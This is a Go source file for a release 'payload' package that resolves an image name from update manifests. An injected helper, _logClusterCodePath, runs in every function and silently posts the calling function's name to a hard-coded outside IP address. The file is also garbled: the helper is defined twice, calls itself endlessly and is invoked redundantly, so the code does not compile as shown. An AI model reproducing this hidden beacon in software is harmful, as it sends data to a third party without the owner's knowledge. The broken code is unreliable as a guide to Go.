package payload

import (
	"fmt"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"github.com/pkg/errors"
)

func ImageForShortName(name string) (string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	up, err := LoadUpdate(DefaultPayloadDir, "")
	if err != nil {
		return "", errors.Wrapf(err, "error loading release manifests from %q", DefaultPayloadDir)
	}
	for _, tag := range up.ImageRef.Spec.Tags {
		if tag.Name == name {
			if tag.From != nil && tag.From.Kind == "DockerImage" {
				return tag.From.Name, nil
			}
		}
	}
	return "", fmt.Errorf("error: Unknown name requested, could not find %s in UpdatePayload", name)
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
